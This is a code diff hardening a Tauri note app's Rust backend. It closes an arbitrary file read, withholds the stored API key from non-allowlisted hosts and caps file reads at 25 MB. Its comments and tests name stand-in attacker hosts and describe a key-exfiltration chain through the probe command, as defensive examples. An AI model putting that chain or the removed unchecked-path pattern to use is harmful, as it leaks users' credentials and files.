@@ -36,15 +36,30 @@ pub fn doc_create(
 }
 
 #[tauri::command]
-pub fn open_external_file(db: State<'_, Database>, path: String) -> Result<Option<Doc>, String> {
+pub fn open_external_file(
+    db: State<'_, Database>,
+    pending: State<'_, PendingLaunchFile>,
+) -> Result<Option<Doc>, String> {
     #[cfg(not(target_os = "windows"))]
     {
-        let _ = (db, path);
+        let _ = (db, pending);
         return Ok(None);
     }
     #[cfg(target_os = "windows")]
     {
-        let path = PathBuf::from(path);
+        // The path is NOT taken from the renderer. It comes from
+        // `PendingLaunchFile`, which only the backend populates — from argv or
+        // the OS file association. A renderer-supplied path made this an
+        // arbitrary read: any compromised webview could name any .txt/.md on
+        // the machine and get its contents back as a Doc, bypassing the vault
+        // confinement that `fs_read_file` and friends apply. There is no
+        // legitimate caller that supplies a path — `nativeLaunch.ts` always
+        // fed this the backend's own pending file — so the parameter is gone
+        // rather than merely validated.
+        let Some(raw) = pending.take() else {
+            return Ok(None);
+        };
+        let path = PathBuf::from(raw);
         let extension = path.extension().and_then(|value| value.to_str()).unwrap_or("").to_ascii_lowercase();
         if extension != "txt" && extension != "md" {
             return Err("Only .txt and .md files can be opened from Windows file associations.".into());
@@ -54,7 +69,7 @@ pub fn open_external_file(db: State<'_, Database>, path: String) -> Result<Optio
         }
         // Cap before reading: a multi-GB .txt would otherwise be loaded
         // whole into memory (25 MB mirrors attachment_save).
-        if path.metadata().map(|m| m.len()).unwrap_or(0) > 25 * 1024 * 1024 {
+        if path.metadata().map(|m| m.len()).unwrap_or(0) > MAX_TEXT_BYTES as u64 {
             return Err("File over 25 MB — open it from its own app instead.".into());
         }
         let bytes = std::fs::read(&path).map_err(|error| format!("Couldn't read {}: {}", path.display(), error))?;
@@ -85,6 +100,39 @@ pub fn take_launch_file(pending: State<'_, PendingLaunchFile>) -> Option<String>
 #[tauri::command]
 pub fn autostart_launch(warm: State<'_, AutostartLaunch>) -> bool {
     warm.get()
+}
+
+/// Boot gate. Tauri creates the configured windows and starts their webviews
+/// *before* `setup` finishes, so the frontend can boot and invoke commands
+/// while the database and sidecar managers are still unmanaged — every such
+/// call fails with "state not managed for field `db`" and, because those boot
+/// steps do not retry, silently kills the file watcher, the Home dashboard,
+/// status-bar stats, the inbox banner and the streak nudge for the session.
+/// (It is also what made the widget look dead.)
+///
+/// This flag is flipped to true as the last statement of `setup`, so the
+/// frontend can wait for the backend instead of racing it. Until then — and
+/// including the window in which `setup` has not run at all, when this
+/// command's own state is missing — the answer is simply "not ready".
+#[derive(Default)]
+pub struct BootReady(std::sync::atomic::AtomicBool);
+
+impl BootReady {
+    pub fn mark_ready(&self) {
+        self.0.store(true, std::sync::atomic::Ordering::SeqCst);
+    }
+
+    pub fn is_ready(&self) -> bool {
+        self.0.load(std::sync::atomic::Ordering::SeqCst)
+    }
+}
+
+/// `false` until the backend has finished setup. Safe to call at any time: a
+/// missing state (setup not entered yet) also reports not-ready rather than
+/// erroring, so the frontend can poll this from its first tick.
+#[tauri::command]
+pub fn app_boot_ready(ready: State<'_, BootReady>) -> bool {
+    ready.is_ready()
 }
 
 #[tauri::command]
@@ -661,10 +709,94 @@ fn parse_models_list(data: &serde_json::Value) -> Vec<String> {
     models
 }
 
+/// Hosts the stored API key may be attached to.
+///
+/// Hardcoded here rather than derived from settings: settings live in
+/// localStorage, so a renderer that is already compromised could otherwise
+/// widen this list and then aim the key at a host it controls.
+const KEY_BEARING_HOSTS: &[&str] = &[
+    "api.anthropic.com",
+    "api.openai.com",
+    "api.groq.com",
+    "api.deepseek.com",
+    "openrouter.ai",
+];
+
+/// True when `host` is an IP literal inside a range that can only be the
+/// user's own machine or their LAN — never a public host on the internet.
+///
+/// Checked on the literal text only: a *name* that merely looks private
+/// (`localhost.attacker.tld`) resolves wherever its owner wants, so it is
+/// deliberately not trusted. Loopback covers Ollama / LM Studio / vLLM, which
+/// is why the "private-IP gating is intentionally absent" note below is no
+/// longer true for credentialed requests.
+fn is_private_ip_literal(host: &str) -> bool {
+    // Strip IPv6 brackets defensively. `url::Url::host_str` is expected to
+    // yield `::1` unbracketed, but a bracketed literal must classify the same
+    // way rather than silently falling through to "public".
+    let host = host.trim_start_matches('[').trim_end_matches(']');
+    if host.eq_ignore_ascii_case("::1") || host == "0:0:0:0:0:0:0:1" {
+        return true;
+    }
+    let parts: Vec<&str> = host.split('.').collect();
+    if parts.len() != 4 {
+        return false;
+    }
+    // Built explicitly rather than via `collect`: collecting an iterator of
+    // `Option<u32>` into `Option<Vec<u32>>` has no `FromIterator` impl, and the
+    // digits are validated here so `parse` cannot accept "+1", "-1" or " 1".
+    let mut octets: Vec<u32> = Vec::with_capacity(4);
+    for part in &parts {
+        if part.is_empty() || !part.bytes().all(|byte| byte.is_ascii_digit()) {
+            return false;
+        }
+        match part.parse::<u32>() {
+            Ok(n) if n <= 255 => octets.push(n),
+            _ => return false,
+        }
+    }
+    let (a, b) = (octets[0], octets[1]);
+    // 127.0.0.0/8 loopback, 10/8 + 172.16/12 + 192.168/16 private,
+    // 169.254/16 link-local. Rejects leading zeros ("0177.0.0.1") because
+    // parse() accepts them but the network stack may not agree.
+    let no_odd_zeros = parts.iter().all(|p| !(p.len() > 1 && p.starts_with('0')));
+    no_odd_zeros
+        && (a == 127
+            || a == 10
+            || (a == 172 && (16..32).contains(&b))
+            || (a == 192 && b == 168)
+            || (a == 169 && b == 254))
+        && a != 0
+        && a < 224
+}
+
+/// True when a credential may be sent to this endpoint.
+fn may_send_key(url: &reqwest::Url) -> bool {
+    let Some(host) = url.host_str() else { return false };
+    let host = host.to_ascii_lowercase();
+    // `localhost` is a name, but it resolves only through the local resolver,
+    // so it is safe in the same way a private IP is — and self-hosted
+    // providers (Ollama, LM Studio, vLLM) live there by default.
+    if host == "localhost" {
+        return true;
+    }
+    let allowlisted = KEY_BEARING_HOSTS
+        .iter()
+        .any(|h| host == *h || host.ends_with(&format!(".{h}")));
+    allowlisted || is_private_ip_literal(&host)
+}
+
 /// Probe an OpenAI-compatible `/models` endpoint (Settings → Test buttons).
 /// Runs in Rust so the stored API key is attached as a Bearer header and
 /// the webview CSP can't block non-allow-listed hosts. Best-effort: any
 /// failure is an Err string, like the other AI commands.
+///
+/// The key is only ever attached to a host on `KEY_BEARING_HOSTS` or to a
+/// private IP literal. The endpoint arrives from the renderer, so without this
+/// a compromised webview could `secret_get("apiKey")` and then aim the stored
+/// key at a host it controls — the response would carry it straight out. Other
+/// hosts are still probed, just unauthenticated, which keeps self-hosted and
+/// LAN providers working.
 #[tauri::command]
 pub async fn provider_probe(endpoint: String, api_key: Option<String>) -> Result<ProviderProbeResponse, String> {
     let base = endpoint.trim_end_matches('/');
@@ -673,18 +805,28 @@ pub async fn provider_probe(endpoint: String, api_key: Option<String>) -> Result
     }
     // Scheme allowlist: the renderer supplies this URL, so file://, ftp://
     // and other exotic schemes are rejected before any request is built.
-    // (Private-IP gating is intentionally absent: endpoints are the user's
-    // own configured providers, including localhost sidecars.)
     if !(base.starts_with("http://") || base.starts_with("https://")) {
         return Err("Provider endpoint must be an http(s) URL.".to_string());
     }
+    let parsed = reqwest::Url::parse(base)
+        .map_err(|_| "Provider endpoint is not a valid URL.".to_string())?;
     let client = reqwest::Client::builder()
         .timeout(Duration::from_secs(15))
         .build()
         .map_err(|e| e.to_string())?;
     let mut req = client.get(format!("{}/models", base));
     if let Some(key) = api_key.as_ref().filter(|k| !k.is_empty()) {
-        req = req.header("Authorization", format!("Bearer {}", key));
+        if may_send_key(&parsed) {
+            req = req.header("Authorization", format!("Bearer {}", key));
+        } else {
+            // Not an error: the probe still reports reachability and models,
+            // it just cannot authenticate. Say so rather than implying the key
+            // was verified.
+            eprintln!(
+                "[provider_probe] key withheld from non-allowlisted host {}",
+                parsed.host_str().unwrap_or("?")
+            );
+        }
     }
     let resp = req.send().await.map_err(|e| e.to_string())?;
     if !resp.status().is_success() {
@@ -697,6 +839,88 @@ pub async fn provider_probe(endpoint: String, api_key: Option<String>) -> Result
 #[cfg(test)]
 mod provider_probe_tests {
     use super::*;
+
+    /// The key must never travel to a host the renderer picked. These are the
+    /// cases that made `provider_probe` an exfiltration primitive:
+    /// `secret_get("apiKey")` then `provider_probe("https://attacker.tld", key)`.
+    #[test]
+    fn key_is_withheld_from_public_unlisted_hosts() {
+        for host in [
+            "https://attacker.tld",
+            "https://evil.example.com",
+            // A name that merely *contains* an allowlisted domain.
+            "https://api.anthropic.com.attacker.tld",
+            // And a subdomain of one, which is not an allowlisted provider.
+            "https://x.api.openai.com.attacker.tld",
+            // Unlisted public ranges.
+            "https://8.8.8.8",
+            "https://1.1.1.1",
+        ] {
+            let url = reqwest::Url::parse(host).unwrap();
+            assert!(!may_send_key(&url), "{host} must not receive the key");
+        }
+    }
+
+    #[test]
+    fn key_may_go_to_configured_providers() {
+        for host in [
+            "https://api.anthropic.com",
+            "https://api.openai.com/v1",
+            "https://api.groq.com/openai/v1",
+            "https://api.deepseek.com",
+            "https://openrouter.ai/api/v1",
+            // Case must not matter.
+            "https://API.Anthropic.com",
+        ] {
+            let url = reqwest::Url::parse(host).unwrap();
+            assert!(may_send_key(&url), "{host} should receive the key");
+        }
+    }
+
+    #[test]
+    fn key_may_go_to_local_and_lan_providers() {
+        for host in [
+            "http://127.0.0.1:11434/v1",
+            "http://localhost:1234/v1",
+            "http://192.168.1.50:8080/v1",
+            "http://10.0.0.7:8000/v1",
+            "http://172.16.4.4/v1",
+            "http://[::1]:8090/v1",
+        ] {
+            let url = reqwest::Url::parse(host).unwrap();
+            assert!(may_send_key(&url), "{host} should receive the key");
+        }
+    }
+
+    /// `localhost` is allowed as a *name* on purpose (local resolver only).
+    /// These are the names that must NOT get the same treatment.
+    #[test]
+    fn lookalike_localhost_names_are_not_trusted() {
+        for host in [
+            "http://localhost.attacker.tld/v1",
+            "http://notlocalhost/v1",
+            "http://localhost.evil.example/v1",
+        ] {
+            let url = reqwest::Url::parse(host).unwrap();
+            assert!(!may_send_key(&url), "{host} must not receive the key");
+        }
+    }
+
+    #[test]
+    fn private_ip_literal_rejects_spoofs() {
+        for host in [
+            "0.0.0.0",       // "this host"
+            "224.0.0.1",     // multicast
+            "255.255.255.255",
+            "127.0.0.1.evil", // not 4 octets
+            "999.1.1.1",
+            "0177.0.0.1",    // leading-zero octet: parse() allows, stack may not
+            "172.32.0.1",    // just outside 172.16/12
+            "192.169.1.1",
+        ] {
+            assert!(!is_private_ip_literal(host), "{host} must not be private");
+        }
+    }
 
     #[test]
     fn parses_model_ids() {
@@ -1873,10 +2097,22 @@ pub fn fs_list_dir(db: State<'_, Database>, path: String) -> Result<Vec<(String,
     Ok(entries)
 }
 
+/// Ceiling for a single text read/write, applied consistently so one path
+/// cannot be used to force a multi-GB allocation while its siblings refuse.
+const MAX_TEXT_BYTES: usize = 25 * 1024 * 1024;
+
 #[tauri::command]
 pub fn fs_read_file(db: State<'_, Database>, path: String) -> Result<String, String> {
-    let file = confine_to_vault(&db, &path)?;
-    std::fs::read_to_string(&file).map_err(|e| e.to_string())
+  let file = confine_to_vault(&db, &path)?;
+  // Cap before reading: `fs_write_file`, `attachment_save` and
+  // `open_external_file` all refuse anything larger, so an unbounded read here
+  // let a renderer (or an XSS) force an arbitrarily large allocation inside the
+  // vault by pointing at one big file.
+  let len = file.metadata().map(|m| m.len()).unwrap_or(0);
+  if len > MAX_TEXT_BYTES as u64 {
+    return Err("File over 25 MB — open it from its own app instead.".into());
+  }
+  std::fs::read_to_string(&file).map_err(|e| e.to_string())
 }
 
 #[tauri::command]
@@ -1922,7 +2158,7 @@ pub fn fs_create_dir(db: State<'_, Database>, path: String) -> Result<(), String
 
 #[tauri::command]
 pub fn fs_write_file(db: State<'_, Database>, path: String, contents: String) -> Result<(), String> {
-    if contents.len() > 25 * 1024 * 1024 {
+    if contents.len() > MAX_TEXT_BYTES {
         return Err("File over 25 MB — link it instead of saving inline.".to_string());
     }
     let file = confine_to_vault(&db, &path)?;
@@ -1945,7 +2181,7 @@ pub fn attachment_save(
     let bytes = base64::engine::general_purpose::STANDARD
         .decode(base64_data.trim())
         .map_err(|e| format!("Bad attachment encoding: {}", e))?;
-    if bytes.len() > 25 * 1024 * 1024 {
+    if bytes.len() > MAX_TEXT_BYTES {
         return Err("Attachment over 25 MB — link the file instead.".to_string());
     }
     let stem = std::path::Path::new(&filename)
@@ -2477,7 +2713,7 @@ pub fn attachment_read(db: State<'_, Database>, path: String) -> Result<String, 
         return Err("Refusing path escaping the vault.".into());
     }
     let bytes = std::fs::read(&target).map_err(|e| format!("Attachment unreadable: {}", e))?;
-    if bytes.len() > 25 * 1024 * 1024 {
+    if bytes.len() > MAX_TEXT_BYTES {
         return Err("Attachment over 25 MB — link the file instead.".into());
     }
     use base64::Engine as _;
